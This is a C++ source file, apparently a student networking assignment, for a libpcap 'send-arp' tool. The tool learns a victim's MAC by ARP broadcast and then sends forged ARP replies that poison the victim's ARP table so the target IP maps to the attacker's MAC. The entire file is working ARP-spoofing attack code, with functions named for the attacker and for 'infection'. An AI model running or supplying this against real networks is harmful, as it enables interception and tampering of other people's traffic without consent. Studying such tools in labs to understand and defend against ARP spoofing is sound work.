#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
/*Adding header due to mac address*/
/*https://tttsss77.tistory.com/138*/
/*https://technote.kr/176*/
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define MAC_ALEN 6

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool AttackerIp(char* device, char* IP_addr)
{
	struct ifreq ifr;
	//char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, device, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
		return 0;
	} else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, IP_addr,sizeof(struct sockaddr));
		//printf("myOwn IP Address is %s\n", IP_addr);
		return 1;
	}
}

bool AttackerMac(char* device, uint8_t *mac_addr)
{
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("Fail to get interface MAC address - socket() failed - %m\n");
		return 0;
	}
	strncpy(ifr.ifr_name, device, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCGIFHWADDR) failed - %m\n");
		close(sockfd);
		return 0;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);

	close(sockfd);
	return 1;
}

void SendBroadcast(pcap_t* handle, uint32_t ip, uint8_t* src_mac, char* src_ip){
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = src_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = src_mac;
	packet.arp_.sip_ = htonl(Ip(src_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void ExtractMac(pcap_t* pcap, uint32_t src_ip, Mac* mac){
	while(true){
		struct pcap_pkthdr* header;
		const u_char* getpacket;
		int res2 = pcap_next_ex(pcap, &header, &getpacket);
		if (res2 == 0) continue;
		if (res2 == PCAP_ERROR || res2 == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res2, pcap_geterr(pcap));
			break;
		}
		PEthHdr eth_hdr = (PEthHdr)getpacket;
		PArpHdr arp_hdr = (PArpHdr)((char*)getpacket+sizeof(EthHdr));
		if(eth_hdr->type()==EthHdr::Arp){ //Arp protocol check
			if(arp_hdr->sip()==Ip(src_ip)){ //sender or target ip check
				*mac = arp_hdr->smac();
				break;
			}
		}
	}
}

void InfectionArpTable(pcap_t* handle, Mac sender_mac, Mac attacker_mac, uint32_t sender_ip, uint32_t target_ip){
	EthArpPacket packet;
	packet.eth_.dmac_ = sender_mac;
	packet.eth_.smac_ = attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = attacker_mac;
	packet.arp_.sip_ = htonl(target_ip);
	packet.arp_.tmac_ = sender_mac;
	packet.arp_.tip_ = htonl(sender_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

int main(int argc, char* argv[]) {
	if (argc>=4 && argc%2!=0) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	//1. Attacker's IP address
	bool flag = 0;
	char attacker_ip[20];
	flag = AttackerIp(dev, attacker_ip);
	if(flag==0)	return -1;

	//2. Attacker's MAC address
	uint8_t attacker_mac[6];
	flag = AttackerMac(dev, attacker_mac);
	if(flag==0)	return -1;

	int count = (argc-2)/2;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); //Send packet pcap
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); //Receive packet pcap

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	for(int i=0; i<count; i++){
		//3. Sender's MAC address & Target's MAC address
		uint32_t sender_ip = Ip(argv[2*(i+1)]); //sender ip raw version
		uint32_t target_ip = Ip(argv[2*(i+1)+1]);//target ip raw version
		Mac sender_mac;
		Mac target_mac;
		char tmp[6];

		SendBroadcast(handle, sender_ip, attacker_mac, attacker_ip);
		ExtractMac(pcap, sender_ip, &sender_mac);

		//4. Infection Arp table & Maintain status & relay
		InfectionArpTable(handle, sender_mac, attacker_mac, sender_ip, target_ip); //infection sender
	}

	pcap_close(pcap);
	pcap_close(handle);
}
